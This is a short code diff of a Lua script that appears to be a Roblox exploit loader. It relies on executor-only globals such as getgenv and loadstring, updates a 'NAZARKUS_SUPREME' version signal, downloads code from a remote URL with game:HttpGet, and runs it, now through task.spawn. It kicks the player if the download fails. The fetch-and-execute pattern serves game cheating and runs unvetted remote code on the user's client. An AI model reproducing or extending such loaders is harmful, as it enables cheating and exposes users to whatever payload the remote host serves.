@@ -33,11 +33,11 @@ if _SC() then
     return
 end
 
-getgenv()._NK_SIGNAL = "NAZARKUS_SUPREME_V6"
+getgenv()._NK_SIGNAL = "NAZARKUS_SUPREME_V7"
 local ok, res = pcall(function() return game:HttpGet(_G) end)
 if ok and res then
     local f = loadstring(res)
-    if f then pcall(f) end
+    if f then task.spawn(f) end
 else
     _L:Kick("Connection Fail. Please try again.")
 end
